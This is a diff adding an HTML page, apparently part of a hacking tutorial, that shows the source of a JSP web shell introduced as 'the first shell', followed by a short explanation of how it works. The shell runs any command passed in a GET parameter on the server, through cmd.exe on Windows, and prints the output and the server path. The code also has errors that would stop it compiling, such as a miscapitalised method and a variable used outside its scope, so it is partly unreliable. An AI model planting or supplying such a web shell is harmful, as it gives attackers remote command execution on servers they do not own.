@@ -1,0 +1,51 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>CMDi</title>
+</head><body>For a crash course in jsp, hit up http://java.sun.com/products/jsp . Now for the first shell.<br/>
+&lt;html&gt;<br/>
+&lt;FORM METHOD=GET ACTION='cmdjsp.jsp'&gt;<br/>
+&lt;INPUT name='cmd' type=text&gt;<br/>
+&lt;INPUT type=submit value='Run'&gt;<br/>
+&lt;/FORM&gt;<br/>
+&lt;%@ page import="java.io.*" %&gt;<br/>
+&lt;%@ page import="java.util.*" %&gt;<br/>
+&lt;%@ page import="javax.servlet.*" %&gt;<br/>
+&lt;%@ page import="javax.servlet.http.*" %&gt;<br/>
+&lt;%<br/>
+String cmd = request.getParameter("cmd");<br/>
+String OS = System.GetProperty("os.name");<br/>
+String output = "";<br/>
+if(cmd != null) {<br/>
+String s = null;<br/>
+try {<br/>
+if(OS.startsWith("Windows")) // if windows use cmd /c, if not, just pass the command<br/>
+{<br/>
+Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);<br/>
+}<br/>
+else <br/>
+{<br/>
+Process p = Runtime.getRuntime().exec(cmd);<br/>
+}<br/>
+BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));<br/>
+while((s = sI.readLine()) != null) {<br/>
+output += s;<br/>
+}<br/>
+}<br/>
+catch(IOException e) {e.printStackTrace();}<br/>
+}<br/>
+%&gt;<br/>
+&lt;strong&gt;Current working directory is:&lt;br&gt;&lt;/strong&gt;<br/>
+&lt;pre&gt;<br/>
+&lt;%= getServletContext().getRealPath("/") %&gt;<br/>
+&lt;/pre&gt;&lt;br&gt;<br/>
+&lt;pre&gt;<br/>
+&lt;%=output %&gt;<br/>
+&lt;/pre&gt;<br/>
+&lt;!-- grabbed from http://michaeldaw.org modified for windows and linux by Joseph Giron --&gt;<br/>
+&lt;/html&gt; <br/>
+<br/>
+Starts off with a standard html form, then imports the proper classes. We store the GET'd variable 'cmd' in the string 'cmd', then store a string<br/>
+containing the current operating system in 'OS'. A check is made to see which OS is running then depending on that, the Runtime.exec object is constructed accordingly. This was what I meant earlier by a minor detail - adding cmd.exe /c rather than just executing a command for windows.<br/>
+We then pass the output of the command to a stream and write it to our html page. </body></html>
